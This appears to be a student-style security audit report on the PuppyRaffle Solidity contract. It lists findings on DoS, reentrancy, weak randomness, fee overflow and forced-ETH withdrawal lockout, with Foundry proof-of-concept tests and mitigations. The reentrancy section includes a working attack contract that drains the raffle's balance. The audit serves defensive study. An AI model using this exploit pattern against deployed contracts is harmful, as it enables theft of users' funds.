# 1

## [M-#] TITLE (Root Cause + Impact)

Looping over an unbounded array in `PuppyRaffle::enterRaffle` can cause DoS

## Description:

DoS attack occurs when a tx is forcibly made to revert when in fact it is expected to pass through. This could be caused by increasing the gas cost of the execution or undesirable behavior due to failed external calls

## Impact:

Faciliates early participants of the raffle over the later ones since the later ones have to pay orders of magnitude higher cost than early players. Gas cost could exceed the maxGasLimit making the service unusable

M / H

## Proof of Concept:

```js

    function testIsDoS() public {
        vm.txGasPrice(1);
        address[] memory players = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players[i] = address(i);
        }

        uint256 gasUsedBefore = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players);
        uint256 gasUsedAfter = gasleft();
        uint256 gasUsed = (gasUsedBefore - gasUsedAfter) * tx.gasprice;

        console.log("Gas used for first 100: ", gasUsed);

        address[] memory players2 = new address[](100);
        for (uint256 i = 0; i < 100; i++) {
            players2[i] = address(i + players.length);
        }

        uint256 gasUsedBefore2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * 100}(players2);
        uint256 gasUsedAfter2 = gasleft();
        uint256 gasUsed2 = (gasUsedBefore2 - gasUsedAfter2) * tx.gasprice;

        console.log("Gas used for second 100: ", gasUsed2);

        assert(gasUsed2 > gasUsed);
    }
```

## Recommended Mitigation:

- we could loop through a bounded array OR maintain a mapping to check for already existing players

# 2

## [H-#] TITLE (Root Cause + Impact)

Reentrancy Attack Vector present in `PuppyRaffle:refund` which could drain the smart contract

## Description:

Due to the function not following the CEI pattern, external call is made before making the necessary state changes, exposing a vulneraability for Reentrnacy by an attacker

## Impact:

All the Funds in the wallet could be drained

H

## Proof of Concept:

```js

    contract AttackContract {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    fallback() external payable {
        if (address(puppyRaffle).balance > 0) {
            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(playerIndex);
        }
    }

    function attack() public {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: 1e18}(players);

        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(playerIndex);
    }
}


    function testReentrancy() public playerEntered {
        AttackContract attackContract = new AttackContract(puppyRaffle);
        vm.deal(address(attackContract), 1 ether);
        attackContract.attack();
        uint256 contractBalance = address(attackContract).balance;
        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attackContract).balance, entranceFee * 2);
    }
```

## Recommended Mitigation:

- follow CEI pattern and reset player address to zero before making the external call
  OR
- use Reentrancy Guard form OZ

# 3

## [H-#] TITLE (Root Cause + Impact)

Weak RNG in the selectWinner func

## Description:

Weak Randomness in the `PuppyRaffle::selectWinner` method; random numbers are being produced by deterministic figures or influenceable figures like block.difficulty by miners

## Impact:

See `MeeBits` Attack

## Proof of Concept:

## Recommended Mitigation:

- Using off-chian distributed RNG via Chainlink VRF or commit-reveal schemes

# 4

## [M-#] TITLE (Root Cause + Impact)

Possible Integer Overflow in `PuppyRaffle:selectWinner` due to `totalFees` being uint64 (max value being 18446744073709551615); this would rollBack our fees to a smaller number makign hte protoocl loose funds

## Description:

`PuppyRaffle::totalFees` is uint64 with max value being 18446744073709551615 (18.something ETH) ; if we get a few more ETH as fees it would rollback to say 1 ETH making us loose 20ETH!!!! from fees

## Impact:

Could be huge probabilisitcally if hte totalFees are too high!

## Proof of Concept:

## Recommended Mitigation:

- Use uint256 for totalFees and ^0.8.0 compiler for overflow / underflow attacks

## [M-#] TITLE (Root Cause + Impact)

Mishandling of ETH in `PuppyRaffle:withdrawFees` could make withdrawals impossible

## Description:

Due to the assert present inside the `Puppyraffle::withdrawFees` ; if the contract receives funds from an attacker selfdestruct, the assert would fail everytime making withdrawal an impossibility

## Impact:

Huge

## Proof of Concept:

```js

    function testLockingWithdrawals() public {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory players = new address[](1);
            players[0] = address(i);
            puppyRaffle.enterRaffle{value: entranceFee}(players);
        }

        log_uint(address(puppyRaffle).balance);

        vm.warp(block.timestamp + duration + 1);

        puppyRaffle.selectWinner();

        log_uint(puppyRaffle.totalFees());

        vm.deal(TEST, 1 ether);
        vm.startPrank(TEST);
        MishandleETH mishandleETH = new MishandleETH(address(puppyRaffle));
        address(mishandleETH).call{value: 1 ether}("");
        assertEq(address(mishandleETH).balance, 1 ether);
        vm.stopPrank();

        mishandleETH.mishandle();

        vm.expectRevert();
        puppyRaffle.withdrawFees();

        // assertEq(feeAddress.balance, (entranceFee * 4) * 20 / 100);
    }
```

## Recommended Mitigation:

- use a different measurement for asserting that withdrawals can only be done after a raffleperiod has ended ;
